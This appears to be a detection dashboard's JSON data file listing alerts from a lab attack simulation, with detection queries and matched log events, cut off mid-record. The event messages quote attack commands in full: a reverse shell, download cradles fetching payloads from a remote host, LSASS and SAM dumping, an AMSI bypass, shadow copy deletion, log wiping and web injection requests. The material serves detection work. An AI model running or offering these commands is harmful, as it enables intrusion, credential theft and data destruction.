window.ARCH = {
 "meta": {
  "generated": "2026-11-12T10:46:18+00:00",
  "window_end": "2026-11-11T12:30:00+00:00",
  "events": 2182,
  "rules": 44,
  "correlations": 8,
  "covered": 40,
  "priority": 45,
  "cases": 3
 },
 "alerts": [
  {
   "id": null,
   "title": "LSASS Memory Dumped via Comsvcs",
   "level": "critical",
   "tactics": [
    "credential_access"
   ],
   "tactic": "credential_access",
   "techniques": [
    "T1003.001"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:40:40.000Z",
   "last": "2026-11-11T11:40:40.000Z",
   "query": "any where process.command_line:\"*comsvcs.dll*\" and process.command_line:\"*MiniDump*\"",
   "events": [
    {
     "ts": "2026-11-11T11:40:40.000Z",
     "message": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\Users\\Public\\lsass.dmp full",
     "user": "LAB\\admin"
    }
   ]
  },
  {
   "id": null,
   "title": "Linux Reverse Shell Command",
   "level": "critical",
   "tactics": [
    "execution"
   ],
   "tactic": "execution",
   "techniques": [
    "T1059.004"
   ],
   "host": "linux01",
   "count": 1,
   "first": "2026-11-11T11:42:00.000Z",
   "last": "2026-11-11T11:42:00.000Z",
   "query": "any where process.command_line like~ (\"*/dev/tcp/*\", \"*bash -i*\", \"*nc -e*\", \"*ncat -e*\", \"*socat exec*\")",
   "events": [
    {
     "ts": "2026-11-11T11:42:00.000Z",
     "message": "session opened for user www-data by (uid=0); command: bash -i >& /dev/tcp/203.0.113.44/4444 0>&1",
     "user": "www-data"
    }
   ]
  },
  {
   "id": null,
   "title": "Ransomware Note Dropped on Disk",
   "level": "critical",
   "tactics": [
    "impact"
   ],
   "tactic": "impact",
   "techniques": [
    "T1486"
   ],
   "host": "WIN10-LAB",
   "count": 2,
   "first": "2026-11-11T11:26:00.000Z",
   "last": "2026-11-11T11:26:05.000Z",
   "query": "any where file.path like~ (\"*\\\\READ_ME.txt\", \"*\\\\DECRYPT_INSTRUCTIONS.txt\", \"*\\\\HOW_TO_DECRYPT.html\", \"*\\\\RESTORE_FILES.txt\")",
   "events": [
    {
     "ts": "2026-11-11T11:26:00.000Z",
     "message": "",
     "user": "LAB\\analyst"
    },
    {
     "ts": "2026-11-11T11:26:05.000Z",
     "message": "",
     "user": "LAB\\analyst"
    }
   ]
  },
  {
   "id": null,
   "title": "SAM or SECURITY Hive Dumped with Reg.exe",
   "level": "critical",
   "tactics": [
    "credential_access"
   ],
   "tactic": "credential_access",
   "techniques": [
    "T1003.002"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:41:00.000Z",
   "last": "2026-11-11T11:41:00.000Z",
   "query": "any where (process.executable.caseless:\"*\\\\reg.exe\" and process.command_line:\"*save*\") and (process.command_line like~ (\"*hklm\\\\sam*\", \"*hklm\\\\security*\", \"*hklm\\\\system*\"))",
   "events": [
    {
     "ts": "2026-11-11T11:41:00.000Z",
     "message": "reg.exe save hklm\\sam C:\\Users\\Public\\sam.save",
     "user": "LAB\\admin"
    }
   ]
  },
  {
   "id": null,
   "title": "Suspicious Process Access to LSASS",
   "level": "critical",
   "tactics": [
    "credential_access"
   ],
   "tactic": "credential_access",
   "techniques": [
    "T1003.001"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:40:08.000Z",
   "last": "2026-11-11T11:40:08.000Z",
   "query": "any where winlog.channel:\"Microsoft-Windows-Sysmon/Operational\" and ((event.code:\"10\" and winlog.event_data.TargetImage:\"*\\\\lsass.exe\" and (winlog.event_data.GrantedAccess like~ (\"0x1010\", \"0x1410\", \"0x1438\", \"0x143a\", \"0x1fffff\"))) and (not (process.executable.caseless like~ (\"*\\\\MsMpEng.exe\", \"*\\\\MpCmdRun.exe\", \"*\\\\svchost.exe\", \"*\\\\csrss.exe\"))))",
   "events": [
    {
     "ts": "2026-11-11T11:40:08.000Z",
     "message": "",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "AMSI Bypass via Reflection",
   "level": "high",
   "tactics": [
    "defense_evasion"
   ],
   "tactic": "defense_evasion",
   "techniques": [
    "T1562.001"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:43:00.000Z",
   "last": "2026-11-11T11:43:00.000Z",
   "query": "any where process.command_line like~ (\"*amsiInitFailed*\", \"*AmsiUtils*\", \"*[Ref].Assembly.GetType*\", \"*SetValue($null*\")",
   "events": [
    {
     "ts": "2026-11-11T11:43:00.000Z",
     "message": "powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
     "user": "LAB\\admin"
    }
   ]
  },
  {
   "id": null,
   "title": "Boot Recovery Disabled via BCDEdit",
   "level": "high",
   "tactics": [
    "impact"
   ],
   "tactic": "impact",
   "techniques": [
    "T1490"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:25:40.000Z",
   "last": "2026-11-11T11:25:40.000Z",
   "query": "any where (process.executable.caseless:\"*\\\\bcdedit.exe\" and (process.command_line:\"*recoveryenabled*\" and process.command_line:\"*no*\")) or (process.executable.caseless:\"*\\\\bcdedit.exe\" and (process.command_line:\"*bootstatuspolicy*\" and process.command_line:\"*ignoreallfailures*\"))",
   "events": [
    {
     "ts": "2026-11-11T11:25:40.000Z",
     "message": "bcdedit.exe /set {default} recoveryenabled no",
     "user": "LAB\\admin"
    }
   ]
  },
  {
   "id": null,
   "title": "Certutil Used to Download or Decode a Payload",
   "level": "high",
   "tactics": [
    "defense_evasion",
    "command_and_control"
   ],
   "tactic": "defense_evasion",
   "techniques": [
    "T1105",
    "T1140"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:37:00.000Z",
   "last": "2026-11-11T11:37:00.000Z",
   "query": "any where process.executable.caseless:\"*\\\\certutil.exe\" and (process.command_line like~ (\"*urlcache*\", \"*verifyctl*\", \"*-decode*\", \"*-decodehex*\"))",
   "events": [
    {
     "ts": "2026-11-11T11:37:00.000Z",
     "message": "certutil.exe -urlcache -split -f http://203.0.113.44/payload.exe C:\\Users\\Public\\p.exe",
     "user": "LAB\\analyst"
    }
   ]
  },
  {
   "id": null,
   "title": "Cloud Access Key Created",
   "level": "high",
   "tactics": [
    "persistence"
   ],
   "tactic": "persistence",
   "techniques": [
    "T1098.001"
   ],
   "host": "aws-prod",
   "count": 1,
   "first": "2026-11-11T11:05:30.000Z",
   "last": "2026-11-11T11:05:30.000Z",
   "query": "any where event.action:\"CreateAccessKey\"",
   "events": [
    {
     "ts": "2026-11-11T11:05:30.000Z",
     "message": "AWS API CreateAccessKey by root in us-east-1: success",
     "user": "root"
    }
   ]
  },
  {
   "id": null,
   "title": "Cloud Root Account Console Login",
   "level": "high",
   "tactics": [
    "initial_access"
   ],
   "tactic": "initial_access",
   "techniques": [
    "T1078.004"
   ],
   "host": "aws-prod",
   "count": 1,
   "first": "2026-11-11T11:05:00.000Z",
   "last": "2026-11-11T11:05:00.000Z",
   "query": "any where event.action:\"ConsoleLogin\" and user.name:\"root\" and event.outcome:\"success\"",
   "events": [
    {
     "ts": "2026-11-11T11:05:00.000Z",
     "message": "AWS API ConsoleLogin by root in us-east-1: success",
     "user": "root"
    }
   ]
  },
  {
   "id": null,
   "title": "Command Injection Attempt in Web Request",
   "level": "high",
   "tactics": [
    "execution"
   ],
   "tactic": "execution",
   "techniques": [
    "T1059"
   ],
   "host": "web01",
   "count": 1,
   "first": "2026-11-11T11:46:26.000Z",
   "last": "2026-11-11T11:46:26.000Z",
   "query": "any where url.query like~ (\"*;wget*\", \"*|bash*\", \"*$(*\", \"*`id`*\", \"*&& curl*\", \"*; curl*\")",
   "events": [
    {
     "ts": "2026-11-11T11:46:26.000Z",
     "message": "203.0.113.77 - - \"GET /ping?host=127.0.0.1;wget http://203.0.113.77/x.sh HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Critical Service Stopped Before Impact",
   "level": "high",
   "tactics": [
    "impact"
   ],
   "tactic": "impact",
   "techniques": [
    "T1489"
   ],
   "host": "WIN10-LAB",
   "count": 4,
   "first": "2026-11-11T11:25:50.000Z",
   "last": "2026-11-11T11:47:10.000Z",
   "query": "any where winlog.channel:\"System\" and (event.code:\"7036\" and (winlog.event_data.ServiceName like~ (\"VSS\", \"SQLSERVERAGENT\", \"MSSQLSERVER\", \"BackupExecAgentBrowser\", \"WinDefend\", \"Sense\")))",
   "events": [
    {
     "ts": "2026-11-11T11:25:50.000Z",
     "message": "The VSS service entered the stopped state.",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:25:55.000Z",
     "message": "The BackupExecAgentBrowser service entered the stopped state.",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:47:00.000Z",
     "message": "The VSS service entered the stopped state.",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Cron Job Executing Remote Content",
   "level": "high",
   "tactics": [
    "execution",
    "persistence"
   ],
   "tactic": "execution",
   "techniques": [
    "T1053.003"
   ],
   "host": "linux01",
   "count": 1,
   "first": "2026-11-11T11:17:00.000Z",
   "last": "2026-11-11T11:17:00.000Z",
   "query": "any where message like~ (\"*CMD (curl*\", \"*CMD (wget*\", \"*CMD (bash -c*\", \"*CMD (sh -c*\")",
   "events": [
    {
     "ts": "2026-11-11T11:17:00.000Z",
     "message": "(root) CMD (curl -s http://203.0.113.44/x.sh | bash)",
     "user": "root"
    }
   ]
  },
  {
   "id": null,
   "title": "Kerberoasting Service Ticket Request",
   "level": "high",
   "tactics": [
    "credential_access"
   ],
   "tactic": "credential_access",
   "techniques": [
    "T1558.003"
   ],
   "host": "DC01",
   "count": 12,
   "first": "2026-11-11T11:39:00.000Z",
   "last": "2026-11-11T11:40:39.000Z",
   "query": "any where winlog.channel:\"Security\" and ((event.code:\"4769\" and winlog.event_data.TicketEncryptionType:\"0x17\") and (not service.name:\"*$\"))",
   "events": [
    {
     "ts": "2026-11-11T11:39:00.000Z",
     "message": "Kerberos service ticket requested for MSSQLSvc/sql01.lab.local:1433",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:39:09.000Z",
     "message": "Kerberos service ticket requested for HTTP/intranet.lab.local",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:39:18.000Z",
     "message": "Kerberos service ticket requested for CIFS/files01.lab.local",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Large Outbound Network Transfer",
   "level": "high",
   "tactics": [
    "exfiltration"
   ],
   "tactic": "exfiltration",
   "techniques": [
    "T1041"
   ],
   "host": "edge-fw01",
   "count": 2,
   "first": "2026-11-11T11:42:00.000Z",
   "last": "2026-11-11T11:42:40.000Z",
   "query": "any where network.direction:\"outbound\" and network.bytes >= 10000000",
   "events": [
    {
     "ts": "2026-11-11T11:42:00.000Z",
     "message": "outbound tcp flow 10.20.0.21 -> 203.0.113.120:443 (15400000 bytes)",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:42:40.000Z",
     "message": "outbound tcp flow 10.20.0.21 -> 203.0.113.120:443 (42800000 bytes)",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Linux Log File Tampering",
   "level": "high",
   "tactics": [
    "defense_evasion"
   ],
   "tactic": "defense_evasion",
   "techniques": [
    "T1070.002"
   ],
   "host": "linux01",
   "count": 2,
   "first": "2026-11-11T11:43:00.000Z",
   "last": "2026-11-11T11:43:20.000Z",
   "query": "any where process.command_line like~ (\"*rm -rf /var/log*\", \"*rm -f /var/log*\", \"*truncate -s 0 /var/log*\", \"*> /var/log/auth.log*\", \"*> /var/log/syslog*\")",
   "events": [
    {
     "ts": "2026-11-11T11:43:00.000Z",
     "message": "session opened for user root by (uid=0); command: rm -rf /var/log/auth.log /var/log/syslog",
     "user": "root"
    },
    {
     "ts": "2026-11-11T11:43:20.000Z",
     "message": "session opened for user root by (uid=0); command: truncate -s 0 /var/log/auth.log",
     "user": "root"
    }
   ]
  },
  {
   "id": null,
   "title": "Mshta Executing Remote or Script Content",
   "level": "high",
   "tactics": [
    "defense_evasion"
   ],
   "tactic": "defense_evasion",
   "techniques": [
    "T1218.005"
   ],
   "host": "WIN10-LAB",
   "count": 2,
   "first": "2026-11-11T11:34:45.000Z",
   "last": "2026-11-11T11:49:40.000Z",
   "query": "any where process.executable.caseless:\"*\\\\mshta.exe\" and (process.command_line like~ (\"*http://*\", \"*https://*\", \"*javascript:*\", \"*vbscript:*\"))",
   "events": [
    {
     "ts": "2026-11-11T11:34:45.000Z",
     "message": "mshta.exe http://203.0.113.44/update.hta",
     "user": "LAB\\analyst"
    },
    {
     "ts": "2026-11-11T11:49:40.000Z",
     "message": "mshta.exe vbscript:Close(Execute(\\\"CreateObject(\\\"\\\"WScript.Shell\\\"\\\").Run \\\"\\\"calc.exe\\\"\\\"\\\"))",
     "user": "LAB\\analyst"
    }
   ]
  },
  {
   "id": null,
   "title": "Office Application Spawns a Shell",
   "level": "high",
   "tactics": [
    "initial_access"
   ],
   "tactic": "initial_access",
   "techniques": [
    "T1566.001"
   ],
   "host": "WIN10-LAB",
   "count": 2,
   "first": "2026-11-11T11:34:00.000Z",
   "last": "2026-11-11T11:35:00.000Z",
   "query": "any where (process.parent.executable.caseless like~ (\"*\\\\WINWORD.EXE\", \"*\\\\EXCEL.EXE\", \"*\\\\OUTLOOK.EXE\", \"*\\\\POWERPNT.EXE\")) and (process.executable.caseless like~ (\"*\\\\powershell.exe\", \"*\\\\pwsh.exe\", \"*\\\\cmd.exe\", \"*\\\\wscript.exe\", \"*\\\\cscript.exe\", \"*\\\\mshta.exe\"))",
   "events": [
    {
     "ts": "2026-11-11T11:34:00.000Z",
     "message": "powershell.exe -NoProfile -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.44/stage2.ps1')",
     "user": "LAB\\analyst"
    },
    {
     "ts": "2026-11-11T11:35:00.000Z",
     "message": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -WindowStyle Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4ANAA0AC8AYQAnACkA",
     "user": "LAB\\analyst"
    }
   ]
  },
  {
   "id": null,
   "title": "PHP File Uploaded to Web Accessible Directory",
   "level": "high",
   "tactics": [
    "initial_access",
    "persistence"
   ],
   "tactic": "initial_access",
   "techniques": [
    "T1505.003"
   ],
   "host": "web01",
   "count": 1,
   "first": "2026-11-11T11:50:00.000Z",
   "last": "2026-11-11T11:50:00.000Z",
   "query": "any where http.request.method:\"POST\" and url.path:\"*.php\" and (url.path like~ (\"*/upload*\", \"*/uploads/*\", \"*/images/*\", \"*/tmp/*\", \"*/files/*\"))",
   "events": [
    {
     "ts": "2026-11-11T11:50:00.000Z",
     "message": "203.0.113.77 - - \"POST /uploads/shell.php HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36\"",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "PowerShell Download Cradle",
   "level": "high",
   "tactics": [
    "execution"
   ],
   "tactic": "execution",
   "techniques": [
    "T1059.001",
    "T1105"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:34:00.000Z",
   "last": "2026-11-11T11:34:00.000Z",
   "query": "any where (process.executable.caseless like~ (\"*\\\\powershell.exe\", \"*\\\\pwsh.exe\")) and (process.command_line like~ (\"*DownloadString*\", \"*DownloadFile*\", \"*Invoke-WebRequest*\", \"*Net.WebClient*\", \"*IEX(*\", \"*Invoke-Expression*\"))",
   "events": [
    {
     "ts": "2026-11-11T11:34:00.000Z",
     "message": "powershell.exe -NoProfile -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.44/stage2.ps1')",
     "user": "LAB\\analyst"
    }
   ]
  },
  {
   "id": null,
   "title": "PowerShell Encoded Command Execution",
   "level": "high",
   "tactics": [
    "execution",
    "defense_evasion"
   ],
   "tactic": "execution",
   "techniques": [
    "T1027",
    "T1059.001"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:35:00.000Z",
   "last": "2026-11-11T11:35:00.000Z",
   "query": "any where (process.executable.caseless like~ (\"*\\\\powershell.exe\", \"*\\\\pwsh.exe\")) and (process.command_line like~ (\"* -enc *\", \"* -encodedcommand *\", \"* -ec *\", \"* -e JAB*\")) and (not (process.parent.executable.caseless like~ (\"*\\\\ccmexec.exe\", \"*\\\\Microsoft.ConfigurationManagement.exe\")))",
   "events": [
    {
     "ts": "2026-11-11T11:35:00.000Z",
     "message": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -WindowStyle Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4ANAA0AC8AYQAnACkA",
     "user": "LAB\\analyst"
    }
   ]
  },
  {
   "id": null,
   "title": "PsExec Service Creation",
   "level": "high",
   "tactics": [
    "lateral_movement"
   ],
   "tactic": "lateral_movement",
   "techniques": [
    "T1569.002"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:31:00.000Z",
   "last": "2026-11-11T11:31:00.000Z",
   "query": "any where winlog.channel:\"System\" and (event.code:\"7045\" and winlog.event_data.ImagePath:\"*PSEXESVC*\")",
   "events": [
    {
     "ts": "2026-11-11T11:31:00.000Z",
     "message": "A service was installed in the system. Service Name: PSEXESVC",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Registry Run Key Persistence",
   "level": "high",
   "tactics": [
    "persistence"
   ],
   "tactic": "persistence",
   "techniques": [
    "T1547.001"
   ],
   "host": "WIN10-LAB",
   "count": 2,
   "first": "2026-11-11T11:27:00.000Z",
   "last": "2026-11-11T11:27:25.000Z",
   "query": "any where registry.path:\"*\\\\CurrentVersion\\\\Run\\\\*\" and (winlog.event_data.Details like~ (\"*\\\\Users\\\\Public\\\\*\", \"*\\\\AppData\\\\Roaming\\\\*\", \"*powershell*\", \"*cmd.exe*\", \"*mshta*\"))",
   "events": [
    {
     "ts": "2026-11-11T11:27:00.000Z",
     "message": "",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:27:25.000Z",
     "message": "",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Rundll32 or Regsvr32 Remote Payload",
   "level": "high",
   "tactics": [
    "defense_evasion"
   ],
   "tactic": "defense_evasion",
   "techniques": [
    "T1218.011"
   ],
   "host": "WIN10-LAB",
   "count": 2,
   "first": "2026-11-11T11:49:00.000Z",
   "last": "2026-11-11T11:49:20.000Z",
   "query": "any where (process.executable.caseless:\"*\\\\rundll32.exe\" and (process.command_line like~ (\"*javascript:*\", \"*http://*\", \"*https://*\"))) or (process.executable.caseless:\"*\\\\regsvr32.exe\" and (process.command_line:\"*/i:*\" and process.command_line:\"*http*\"))",
   "events": [
    {
     "ts": "2026-11-11T11:49:00.000Z",
     "message": "rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication\\\";document.write();GetObject(\\\"script:http://203.0.113.44/a.sct\\\")",
     "user": "LAB\\analyst"
    },
    {
     "ts": "2026-11-11T11:49:20.000Z",
     "message": "regsvr32.exe /s /n /u /i:http://203.0.113.44/payload.sct scrobj.dll",
     "user": "LAB\\analyst"
    }
   ]
  },
  {
   "id": null,
   "title": "SSH Authorized Keys Modified",
   "level": "high",
   "tactics": [
    "persistence"
   ],
   "tactic": "persistence",
   "techniques": [
    "T1098.004"
   ],
   "host": "linux01",
   "count": 1,
   "first": "2026-11-11T11:41:20.000Z",
   "last": "2026-11-11T11:41:20.000Z",
   "query": "any where file.path:\"*authorized_keys\"",
   "events": [
    {
     "ts": "2026-11-11T11:41:20.000Z",
     "message": "file=/root/.ssh/authorized_keys operation=write user=root",
     "user": "root"
    }
   ]
  },
  {
   "id": null,
   "title": "Shadow Copy Deletion via VSSAdmin or WMIC",
   "level": "high",
   "tactics": [
    "impact"
   ],
   "tactic": "impact",
   "techniques": [
    "T1490"
   ],
   "host": "WIN10-LAB",
   "count": 2,
   "first": "2026-11-11T11:25:00.000Z",
   "last": "2026-11-11T11:25:20.000Z",
   "query": "any where (process.executable.caseless:\"*\\\\vssadmin.exe\" and process.command_line:\"*delete*\" and process.command_line:\"*shadows*\") or (process.executable.caseless:\"*\\\\wmic.exe\" and (process.command_line:\"*shadowcopy*\" and process.command_line:\"*delete*\")) or (process.command_line:\"*Win32_ShadowCopy*\" and process.command_line:\"*Delete*\")",
   "events": [
    {
     "ts": "2026-11-11T11:25:00.000Z",
     "message": "vssadmin.exe delete shadows /all /quiet",
     "user": "LAB\\admin"
    },
    {
     "ts": "2026-11-11T11:25:20.000Z",
     "message": "wmic.exe shadowcopy delete",
     "user": "LAB\\admin"
    }
   ]
  },
  {
   "id": null,
   "title": "Sudoers File Modified",
   "level": "high",
   "tactics": [
    "privilege_escalation"
   ],
   "tactic": "privilege_escalation",
   "techniques": [
    "T1548.003"
   ],
   "host": "linux01",
   "count": 1,
   "first": "2026-11-11T11:41:00.000Z",
   "last": "2026-11-11T11:41:00.000Z",
   "query": "any where file.path like~ (\"*/etc/sudoers*\", \"*/etc/sudoers.d/*\")",
   "events": [
    {
     "ts": "2026-11-11T11:41:00.000Z",
     "message": "file=/etc/sudoers.d/backup operation=write user=root",
     "user": "root"
    }
   ]
  },
  {
   "id": null,
   "title": "Suspicious Service Installed From User-Writable Path",
   "level": "high",
   "tactics": [
    "persistence",
    "privilege_escalation"
   ],
   "tactic": "persistence",
   "techniques": [
    "T1543.003"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:44:00.000Z",
   "last": "2026-11-11T11:44:00.000Z",
   "query": "any where winlog.channel:\"System\" and (event.code:\"7045\" and (winlog.event_data.ImagePath like~ (\"*\\\\Users\\\\Public\\\\*\", \"*\\\\AppData\\\\*\", \"*\\\\Temp\\\\*\", \"*\\\\ProgramData\\\\*\", \"*cmd.exe /c*\", \"*powershell*\")) and (not (winlog.event_data.ServiceName like~ (\"WaaSMedicSvc\", \"BITS\", \"WinDefend\"))))",
   "events": [
    {
     "ts": "2026-11-11T11:44:00.000Z",
     "message": "A service was installed in the system. Service Name: UpdaterSvc",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Systemd Service Unit Created",
   "level": "high",
   "tactics": [
    "persistence"
   ],
   "tactic": "persistence",
   "techniques": [
    "T1543.002"
   ],
   "host": "linux01",
   "count": 1,
   "first": "2026-11-11T11:41:40.000Z",
   "last": "2026-11-11T11:41:40.000Z",
   "query": "any where (file.path like~ (\"*/etc/systemd/system/*\", \"*/lib/systemd/system/*\")) and file.path:\"*.service\"",
   "events": [
    {
     "ts": "2026-11-11T11:41:40.000Z",
     "message": "file=/etc/systemd/system/updater.service operation=write user=root",
     "user": "root"
    }
   ]
  },
  {
   "id": null,
   "title": "UAC Bypass via Auto-Elevating Binary",
   "level": "high",
   "tactics": [
    "privilege_escalation"
   ],
   "tactic": "privilege_escalation",
   "techniques": [
    "T1548.002"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:36:00.000Z",
   "last": "2026-11-11T11:36:00.000Z",
   "query": "any where (process.parent.executable.caseless like~ (\"*\\\\fodhelper.exe\", \"*\\\\eventvwr.exe\", \"*\\\\sdclt.exe\", \"*\\\\computerdefaults.exe\")) and (process.executable.caseless like~ (\"*\\\\cmd.exe\", \"*\\\\powershell.exe\", \"*\\\\pwsh.exe\"))",
   "events": [
    {
     "ts": "2026-11-11T11:36:00.000Z",
     "message": "cmd.exe /c C:\\Users\\Public\\svc.exe",
     "user": "LAB\\analyst"
    }
   ]
  },
  {
   "id": null,
   "title": "WMI Event Subscription Persistence",
   "level": "high",
   "tactics": [
    "persistence"
   ],
   "tactic": "persistence",
   "techniques": [
    "T1546.003"
   ],
   "host": "WIN10-LAB",
   "count": 2,
   "first": "2026-11-11T11:29:00.000Z",
   "last": "2026-11-11T11:29:20.000Z",
   "query": "any where (process.command_line:\"*root\\\\subscription*\" and process.command_line:\"*CommandLineEventConsumer*\") or (process.command_line like~ (\"*Register-WmiEvent*\", \"*__EventFilter*\", \"*CommandLineEventConsumer*\"))",
   "events": [
    {
     "ts": "2026-11-11T11:29:00.000Z",
     "message": "wmic.exe /namespace:\\\\root\\subscription path __EventFilter create Name=Updater",
     "user": "LAB\\admin"
    },
    {
     "ts": "2026-11-11T11:29:20.000Z",
     "message": "wmic.exe /namespace:\\\\root\\subscription path CommandLineEventConsumer create Name=UpdaterExec CommandLineTemplate=\"C:\\Users\\Public\\svc.exe\"",
     "user": "LAB\\admin"
    }
   ]
  },
  {
   "id": null,
   "title": "Windows Defender Real-Time Protection Disabled",
   "level": "high",
   "tactics": [
    "defense_evasion"
   ],
   "tactic": "defense_evasion",
   "techniques": [
    "T1562.001"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:42:00.000Z",
   "last": "2026-11-11T11:42:00.000Z",
   "query": "any where winlog.channel:\"Microsoft-Windows-Windows Defender/Operational\" and (event.code like~ (\"5001\", \"5010\", \"5012\"))",
   "events": [
    {
     "ts": "2026-11-11T11:42:00.000Z",
     "message": "Windows Defender Antivirus Real-time Protection feature has been disabled.",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Windows Event Log Cleared",
   "level": "high",
   "tactics": [
    "defense_evasion"
   ],
   "tactic": "defense_evasion",
   "techniques": [
    "T1070.001"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:43:50.000Z",
   "last": "2026-11-11T11:43:50.000Z",
   "query": "any where winlog.channel:\"Security\" and event.code:\"1102\"",
   "events": [
    {
     "ts": "2026-11-11T11:43:50.000Z",
     "message": "The audit log was cleared.",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "DNS Query to Exfiltration Domain",
   "level": "medium",
   "tactics": [
    "command_and_control"
   ],
   "tactic": "command_and_control",
   "techniques": [
    "T1071.004"
   ],
   "host": "WIN10-LAB",
   "count": 25,
   "first": "2026-11-11T11:38:00.000Z",
   "last": "2026-11-11T11:40:00.000Z",
   "query": "any where dns.question.name like~ (\"*.exfil.*\", \"*tunnel.example*\", \"*dns-exfil*\")",
   "events": [
    {
     "ts": "2026-11-11T11:38:00.000Z",
     "message": "",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:38:04.000Z",
     "message": "",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:38:08.000Z",
     "message": "",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Data Staged with Archive Utility",
   "level": "medium",
   "tactics": [
    "collection"
   ],
   "tactic": "collection",
   "techniques": [
    "T1560.001"
   ],
   "host": "WIN10-LAB",
   "count": 2,
   "first": "2026-11-11T11:45:00.000Z",
   "last": "2026-11-11T11:45:30.000Z",
   "query": "any where process.command_line like~ (\"*rar a *\", \"*7z a *\", \"*Compress-Archive*\", \"*makecab *\")",
   "events": [
    {
     "ts": "2026-11-11T11:45:00.000Z",
     "message": "cmd.exe /c rar a C:\\Users\\Public\\exfil.rar C:\\Users\\analyst\\Documents\\*",
     "user": "LAB\\analyst"
    },
    {
     "ts": "2026-11-11T11:45:30.000Z",
     "message": "powershell.exe -c Compress-Archive -Path C:\\Users\\analyst\\Documents\\* -DestinationPath C:\\Users\\Public\\exfil.zip",
     "user": "LAB\\analyst"
    }
   ]
  },
  {
   "id": null,
   "title": "New Local User Account Created",
   "level": "medium",
   "tactics": [
    "persistence"
   ],
   "tactic": "persistence",
   "techniques": [
    "T1136.001"
   ],
   "host": "linux01",
   "count": 1,
   "first": "2026-11-11T11:15:00.000Z",
   "last": "2026-11-11T11:15:00.000Z",
   "query": "any where message:\"*new user:*\"",
   "events": [
    {
     "ts": "2026-11-11T11:15:00.000Z",
     "message": "new user: name=backup, UID=1002, GID=1002, home=/home/backup, shell=/bin/bash",
     "user": "root"
    }
   ]
  },
  {
   "id": null,
   "title": "Path Traversal Attempt in Web Request",
   "level": "medium",
   "tactics": [
    "initial_access"
   ],
   "tactic": "initial_access",
   "techniques": [
    "T1190"
   ],
   "host": "web01",
   "count": 2,
   "first": "2026-11-11T11:46:20.000Z",
   "last": "2026-11-11T11:46:23.000Z",
   "query": "any where (url.path like~ (\"*../*\", \"*..%2f*\", \"*%2e%2e*\")) or (url.query like~ (\"*../*\", \"*..%2f*\", \"*%2e%2e*\"))",
   "events": [
    {
     "ts": "2026-11-11T11:46:20.000Z",
     "message": "203.0.113.77 - - \"GET /download?../../../../etc/passwd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:46:23.000Z",
     "message": "203.0.113.77 - - \"GET /static?..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1\" 500 512 \"-\" \"Mozilla/5.0\"",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "SQL Injection Attempt in Web Request",
   "level": "medium",
   "tactics": [
    "initial_access"
   ],
   "tactic": "initial_access",
   "techniques": [
    "T1190"
   ],
   "host": "web01",
   "count": 5,
   "first": "2026-11-11T11:46:05.000Z",
